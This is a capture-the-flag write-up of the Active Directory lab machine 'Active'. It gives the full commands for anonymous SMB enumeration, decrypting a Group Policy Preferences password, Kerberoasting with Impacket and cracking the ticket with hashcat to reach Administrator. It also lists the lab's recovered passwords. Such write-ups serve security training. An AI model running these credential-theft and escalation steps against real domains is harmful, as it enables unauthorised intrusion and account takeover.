Summary

Active is an Active Directory machine that demonstrates two common attack techniques: exploitation of Group Policy Preferences (GPP) to recover credentials and Kerberoasting to escalate privileges to Domain Admin.

The attack chain starts with anonymous SMB access, leads to credential recovery from a GPP configuration file, and ends with cracking a Kerberos service ticket to obtain Administrator access.

Enumeration

SMB Anonymous Access

Anonymous SMB login was allowed, revealing several shares including NETLOGON, SYSVOL, and Replication. 

smbclient -L //10.129.19.143 -N

Group Policy Preferences (GPP) Credentials

Inside the Replication share, a Groups.xml file was found containing an encrypted password for the user SVC_TGS. 

cpassword: edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw...

The password was decrypted using:

gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw...

Recovered Credentials: SVC_TGS : GPPstillStandingStrong2k18

Initial Access

Using the recovered credentials, SMB access was obtained to domain shares and the user directory. The user.txt flag was retrieved from the SVC_TGS Desktop. 

smbclient //10.129.19.143/Users -U SVC_TGS

Privilege Escalation

Kerberoasting Attack

The GetUserSPNs.py tool from Impacket was used to request service tickets for domain accounts. 

GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.19.143 -request

A Kerberos service ticket for the Administrator account was successfully extracted.

Hash Cracking

The extracted ticket was cracked using Hashcat:

hashcat -m 13100 hash.txt rockyou.txt

Recovered Password: Ticketmaster1968

Root Access

Using the cracked Administrator credentials, SMB access was obtained and the root.txt flag was retrieved from the Administrator Desktop. 

smbclient //10.129.19.143/Users -U Administrator

Lessons Learned

This machine demonstrates how legacy Group Policy Preferences can leak credentials and how Kerberoasting can be used to escalate privileges in Active Directory environments. Proper service account password hygiene and disabling legacy GPP mechanisms are critical security controls in AD environments.
